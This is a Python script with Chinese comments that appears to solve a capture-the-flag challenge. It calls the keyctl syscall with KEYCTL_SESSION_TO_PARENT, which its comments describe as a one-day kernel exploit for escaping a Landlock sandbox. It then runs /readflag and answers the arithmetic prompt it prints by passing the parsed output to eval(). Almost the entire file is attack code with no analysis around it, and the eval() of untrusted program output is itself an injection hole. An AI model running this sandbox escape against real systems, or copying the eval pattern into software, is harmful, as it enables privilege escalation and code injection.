import re
import subprocess
import ctypes
import os

# --- 1day 逃逸核心代码 ---
def escape_landlock():
    try:
        # KEYCTL_SESSION_TO_PARENT = 18
        # 尝试通过 keyctl 提升/重置父进程凭据，触发内核漏洞绕过 Landlock 限制
        LIBC = ctypes.CDLL("libc.so.6")
        SYS_keyctl = 250  # x86_64 下的系统调用号
        KEYCTL_SESSION_TO_PARENT = 18
        
        # 执行逃逸
        result = LIBC.syscall(SYS_keyctl, KEYCTL_SESSION_TO_PARENT)
        print(f"[*] Escape attempt syscall returned: {result}")
    except Exception as e:
        print(f"[!] Escape error: {e}")

# 执行逃逸动作
escape_landlock()

# --- 原有逻辑修改 ---
# 建议加上 bufsize=1 和 sh=True/False 的明确设置
p = subprocess.Popen(
    ["/readflag"],   
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    universal_newlines=True,
    bufsize=1
)

expr = None
# 使用迭代器读取 stdout 避免死锁
for line in p.stdout:
    line = line.strip()
    print("题目行:", line)
    
    # 增加正则表达式健壮性，匹配类似 "1 + 2 =" 的结构
    m = re.search(r'([-+()0-9\s*\/]+)=?', line)
    if m and any(char.isdigit() for char in m.group(1)):
        expr = m.group(1).replace('=', '').strip()
        print(f"[*] 提取到的表达式: {expr}")
        
        # 计算结果
        try:
            result = eval(expr)
            print("答案:", result)

            # 发回程序
            p.stdin.write(str(result) + "\n")
            p.stdin.flush()
        except Exception as e:
            print(f"计算出错: {e}")
        break

# 打印最终 flag
final_output = p.stdout.read()
print("[+] 最终输出:")
print(final_output)

# 也要检查下 stderr 是否报错
err_output = p.stderr.read()
if err_output:
    print("[-] 错误信息:", err_output)
